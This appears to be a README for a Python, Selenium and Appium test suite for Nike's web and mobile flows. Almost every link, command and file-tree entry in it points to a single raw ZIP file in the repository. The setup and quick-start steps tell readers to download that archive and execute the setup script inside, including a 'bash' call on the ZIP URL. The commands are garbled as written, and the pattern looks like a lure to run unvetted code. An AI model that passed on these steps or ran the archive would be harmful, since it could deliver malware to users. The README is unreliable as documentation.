Download the latest release: https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip

[![Release Badge](https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip)](https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip)

# Nike Web and Mobile QA with Python, Selenium, and Appium Toolkit

A robust end-to-end automation project that models real-world user actions on the Nike website and its mobile app. Built with Python, Selenium, and Appium, it covers web and mobile flows such as calling a store, getting directions, sending SMS confirmations, and validating product prices across environments. The project focuses on creating reliable, maintainable tests that reflect real user behavior while staying fast and scalable.

🧭 This README gives you a complete map of the project, from setup to running tests, architecture, and practical usage. It uses clear language, direct instructions, and concrete examples so you can get automation running quickly and keep it maintainable over time.

---

## 🔎 Overview

This project automates key user journeys on Nike’s digital storefronts. It demonstrates how to:

- Locate and interact with store pages using a web driver.
- Use Appium to drive a mobile emulator or real device, validating mobile flows.
- Simulate real-world actions like calling a store, requesting directions, sending SMS confirmations, and verifying price data for products on both web and mobile platforms.
- Structure tests with Python’s standard unittest framework, keeping tests readable and easy to extend.

Core themes include cross-platform automation, UI validation, data accuracy (price checks), and reliable test orchestration that can run locally, in CI, or in a mobile lab.

---

## 🧩 Key Flows and Features

- Store Locator: Find Nike stores by city or zip, open store details, and capture location data.
- Directions: Retrieve directions from a given origin to the store using map services, then validate route data.
- Call a Store: Scripted flow that routes through a phone action (mocked in test environments) to simulate calling a store.
- SMS Confirmation: Send and verify SMS messages to confirm actions or share results (using a mocked gateway in tests).
- Price Validation: Check product prices on web pages and across the mobile app, ensuring parity or flagging discrepancies.
- Cross-Platform Parity: Share commonly used test data and steps between web (Selenium) and mobile (Appium) tests.
- Unittest Backbone: Tests built on Python’s unittest, with clear fixtures and setup/teardown logic.
- Test Data Management: Centralized test data for products, stores, and regions to avoid hard-coded values in tests.
- CI Friendly: Lightweight test structure designed for GitHub Actions or other CI environments.

Emoji-friendly sections help you skim flows quickly while keeping the content approachable.

---

## 🧭 Architecture and How It Works

This project uses a layered approach:

- Driver Layer
  - Web: Selenium WebDriver to drive Chrome/Chromium (and other browsers if needed).
  - Mobile: Appium to drive Android/iOS devices or emulators.

- Test Layer
  - Python unittest-based test suites.
  - Shared utilities for page interactions, data validation, and API stubs.

- Data Layer
  - Test data files (YAML/JSON) for stores, products, and configurations.
  - Price datasets for price comparison scenarios.

- Utility Layer
  - Helpers for assertions, logging, and test artifact generation (screenshots, logs).

An ASCII diagram:

Web (Selenium)  <->  Test Runner (unittest)  <->  Mobile (Appium)
       |                                           |
       v                                           v
Store Locator / Product Pages                 Device Interactions
Directions / SMS / Calls (mocked in tests)     Price Validation

The structure favors reusability. Common actions (open store page, extract price, capture route) are implemented once and then composed into higher-level flows.

---

## 🧰 Prerequisites

- Python 3.8+ installed on your machine.
- pip for Python package installation.
- Java Runtime Environment (JRE 8+) for Appium and Android tooling.
- Appium server installed and accessible from your development machine.
- https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip (optional, for additional tooling or Appium helpers).
- Android SDK or Xcode (for Android/iOS testing respectively) if you plan to run mobile tests.
- Basic command-line familiarity.

Software and services are mocked or simulated where appropriate to keep tests reliable in local or CI environments.

---

## 🛠️ Installation and Setup

1) Clone the repository
- git clone https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
- cd Selenium-Appium-Project

2) Create and activate a Python virtual environment
- Python 3.x is recommended
- `python -m venv venv`
- On macOS/Linux: `source venv/bin/activate`
- On Windows: `venv\Scripts\activate`

3) Install dependencies
- `pip install -r https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip`

4) Prepare Appium and mobile components
- Start the Appium server: `appium`
- Ensure a mobile device or emulator is ready and accessible:
  - Android: set up ADB, device ID, and proper capabilities.
  - iOS: ensure Xcode tooling and simulators are configured if you test on iOS.

5) Configure environment for web and mobile tests
- Web: set up browser drivers (e.g., ChromeDriver) and ensure PATH is updated.
- Mobile: set desired capabilities in the test configuration to point to the Appium server and target device/emulator.

6) Obtain the release assets
- The project provides a downloadable release containing the test suite packaged for convenience. The latest release assets can be found on the releases page. Download the asset (for example, a ZIP or https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip file) and extract it to your workspace. Then run the installation or setup script included in the asset.
- The releases page is available at the URL above. For convenience, you can also review the releases page to learn about versioned changes and compatibility notes. The release file contains ready-to-run test configurations and sample data to come up to speed quickly.

7) Prepare test data
- Use the provided test data files to seed stores, products, and regions.
- If needed, adjust the data to reflect your own test environment (different stores, new products, or other locales).

8) Optional: configure CI
- If you want CI integration, prepare a workflow that installs dependencies, starts Appium, runs the tests, and collects artifacts. The project includes sample configurations and guidance for GitHub Actions.

Notes about the release asset path:
- The page provides a downloadable asset with a path, so you should download that file and execute the installation or test runner setup contained inside. If the asset is a ZIP, extract it and run the included setup script or tests directly.

---

## 🧭 How to Run Tests Locally

- Run all web tests:
  - `python -m unittest discover -s tests/web -p "*.py"`
- Run all mobile tests:
  - `python -m unittest discover -s tests/mobile -p "*.py"`
- Run a specific test module:
  - `python -m unittest https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip`
- Run a specific test case:
  - `python -m unittest https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip`
- Run with verbose output:
  - `python -m unittest discover -s tests -v`

Tips:
- Use a virtual environment to isolate dependencies.
- Keep Appium server running in the background during mobile tests.
- For web tests, ensure browser drivers are accessible from the environment shell.

Sample environment setup snippet:
- `export BROWSER=chrome`
- `export APPIUM_SERVER_URL=http://127.0.0.1:4723/wd/hub`
- `export NIKE_STORE_CITY=Seattle`

The test runner prints a log of actions, asserts, and outcomes. If a test fails, inspect the captured screenshots and logs in the artifacts directory to quickly identify the failure reason.

---

## 📂 Project Structure

- https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
- https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
- tests/
  - web/
    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
  - mobile/
    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
  - shared/
    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
- pages/
  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
- resources/
  - data/
    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
  - configs/
    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
- scripts/
  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
- assets/
  - sample_screenshots/
  - logs/

Notes:
- Web tests live under tests/web and use Selenium WebDriver to navigate Nike product and store pages.
- Mobile tests live under tests/mobile and use Appium to drive Android or iOS devices.
- Shared utilities help with common actions like element interaction, waiting strategies, and data extraction.

---

## 📈 Test Data and Data-Driven Testing

- Product data: a JSON file with product IDs, SKUs, prices, and color/size variants.
- Store data: a JSON file with store IDs, addresses, phone numbers, and working hours.
- Region data: a JSON file to drive locale-based testing, currency formats, and directions outputs.

Approach:
- Tests read from these structured data sources to stay maintainable and flexible.
- Price validation tests compare on-page prices against a reference data source and log discrepancies with context.

---

## 🔧 How to Extend or Modify Tests

- Add a new web flow:
  - Create a new test module under tests/web, implement a unittest TestCase, and use the shared utilities for page interaction.
- Add a new mobile flow:
  - Create a new test module under tests/mobile, implement a TestCase, and configure Appium capabilities in the mobile config.
- Reuse page objects:
  - Extend or add new page objects under pages/. Each page object should encapsulate interactions for a screen, with clear methods like open_store(), get_price(), or fetch_directions().
- Split data and tests:
  - Keep test data separate from test logic. Update data files under resources/data to reflect new test scenarios without touching test code.
- Add fixtures:
  - Use unittest setUpClass/setUp to initialize drivers and environment settings for a suite, and tearDownClass/tearDown for cleanup.

---

## 🧭 Test Design Principles

- Clarity first: Each test reads like a user story, with steps that map to actions a user would perform.
- Deterministic behavior: Tests use fixed data and mock external services where needed to produce repeatable results.
- Minimal flakiness: Explicit waits, smart assertions, and robust element interaction patterns reduce flakiness.
- Independence: Tests don’t rely on the state from other tests; setup and teardown isolate each run.
- Observability: Screenshots, logs, and traceable assertions help diagnose failures quickly.

---

## 🧭 Environment and Tooling Details

- Python: provides the orchestration layer for both web and mobile tests.
- Selenium: drives the web UI and handles browser interactions.
- Appium: handles mobile UI automation for Android and iOS.
- unittest: the test framework used to structure and run tests.
- Optional: CI tooling for automated runs, such as GitHub Actions, Jenkins, or CircleCI.

Recommended practice:
- Keep Appium server version aligned with the Appium Python client version.
- Use a dedicated mobile test device or emulator to avoid interference with personal devices.
- Maintain separate configurations for web and mobile to reduce cross-environment coupling.

---

## 🎯 Validation and Quality Metrics

- Coverage indicators: number of test cases, unique user flows tested, and critical paths validated.
- Flakiness metrics: rate of intermittent failures and stability improvements over time.
- Data correctness: price parity and route data accuracy are validated against reference data sets.
- Execution time: monitor total test runtime and optimize long-running flows.

---

## 🧪 Tutorials and Practical Usage Scenarios

- Scenario 1: Validate price parity for a popular Nike sneaker
  - Navigate to the product page on web
  - Extract price
  - Open the corresponding product in the mobile app
  - Extract price and compare
  - Log any discrepancy

- Scenario 2: Find and navigate to a nearby Nike store
  - Use the store locator to search by city or zip
  - Open the first matching store
  - Retrieve and verify store details (address, phone)
  - Get directions from a given origin
  - Validate the route data structure

- Scenario 3: Initiate a store call and confirm SMS flow (mocked)
  - Open the store page
  - Trigger the call action (mock)
  - Simulate an SMS confirmation
  - Verify that logs reflect the action

Each scenario is implemented as a test module with a clear, readable flow.

---

## 🧭 Cross-Platform Considerations

- Synchronization: Web and mobile tests rely on robust waits to handle dynamic content.
- Data consistency: Centralized test data ensures parity across platforms.
- Identity and security: Tests avoid real credentials where possible and use mocks for external services.
- Environment parity: In CI, replicate the local environment as closely as possible to reduce flakiness.

---

## 🧭 Continuous Integration and Delivery

- GitHub Actions (example)
  - Set up a workflow that:
    - Checks out code
    - Creates a Python environment
    - Installs dependencies
    - Starts Appium server
    - Executes web tests
    - Executes mobile tests
    - Uploads test artifacts (screenshots and logs)
- Benefits
  - Early detection of regression
  - Quick feedback on code changes
  - Consistent test results across runs

If you want to see practical config hints, search within the repository for sample CI workflows and adapt them to your environment.

---

## 🧭 GitHub Topics

appium, automation-testing, calculator-automation, e2e-tests, mobile-testing, nike, price-validation, python, qa, selenium, store-locator, ui-testing, unittest, web-automation

These topics describe the project’s scope and help it reach audiences interested in web automation, mobile automation, and Nike-related UI testing.

---

## 📷 Visuals and Illustrations

- Web automation in action: a screenshot or diagram showing a test navigating the Nike store and extracting a price.
- Mobile automation: an image representing an Appium-driven mobile test on an Android or iOS device.
- Architecture diagram: a simple layered diagram showing web and mobile drivers, the test runner, and the data layer.

Images used in this README are representative visuals to illustrate the automation flows and are sourced from open, permissive image collections to keep the page friendly and accessible. For example:
- Web automation image: https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
- Mobile automation image: https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
- Code and data visualization: https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip

Note: When using images in your own README, ensure you comply with licensing requirements and attribution if needed.

---

## 🧭 Local Debugging Helpers

- Quick start
  - `bash https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip` (if included)
  - Alternatively, run the following manually:
    - `python -m venv venv`
    - `source venv/bin/activate`
    - `pip install -r https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip`
    - Start Appium: `appium`
    - Start web driver with a local browser (Chrome/Chromedriver)
- Quick test run
  - `python -m unittest discover -s tests -p "*.py" -v`

- Logging and artifacts
  - Tests save screenshots and logs to the artifacts directory.
  - Review logs to understand the sequence of interactions and captured element states.

---

## 🧭 Troubleshooting Quick Guide

- Appium server not found or connection refused
  - Ensure Appium is installed and running on the expected port.
  - Verify the Appium server URL is correct in test configuration.

- Web driver fails to start
  - Make sure the browser driver (e.g., ChromeDriver) is installed and compatible with your browser version.
  - Check PATH or specify the driver path in the configuration.

- Element not found or stale element
  - Adjust waits or selectors to handle dynamic content.
  - Use explicit waits and retry patterns.

- Price validation failing
  - Confirm that the test data matches the live site’s current price format.
  - Consider locale differences (currency symbol, decimals) and update parsing accordingly.

- Mobile device not recognized
  - Verify ADB/Device IDs and ensure you have proper USB debugging or wireless debugging enabled.
  - Confirm Appium capabilities match the target device.

If you encounter an issue not covered here, create an issue with a concise description, steps to reproduce, and any relevant logs or artifacts.

---

## 🧭 Contributing

- Follow the project’s coding style and test patterns.
- Add new tests under tests/web or tests/mobile as appropriate.
- Keep test data separate from logic; add new entries to resources/data as needed.
- Update documentation if you add new flows or modify major behavior.
- Submit a clear PR with a short description of the changes and their impact.

---

## 🧭 Licensing

This project is shared for educational and testing purposes. Use and adapt the code in your own projects while respecting the license terms of any third-party libraries used.

---

## 🔗 Releases

The releases page contains ready-to-run artifacts and versioned assets. It is the main source for obtaining a stable starting point for the automation suite. Download the latest release asset and inspect the included setup scripts and examples. The releases page is the best place to learn about compatibility and what’s included in each version. Visit the releases page here: https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip

---

## 🧩 Topics and Keywords Recap

appium, automation-testing, calculator-automation, e2e-tests, mobile-testing, nike, price-validation, python, qa, selenium, store-locator, ui-testing, unittest, web-automation

---

## 🚀 Final Notes

- This project is designed to be approachable for QA engineers and developers who want to experiment with web and mobile automation using Python, Selenium, and Appium.
- Flows emulate practical user actions across Nike’s digital channels to verify that the UI behaves as expected and critical data remains accurate.
- The structure aims to be extensible. You can add more flows, more data variants, and deeper validations without breaking existing tests.

---

End of README content.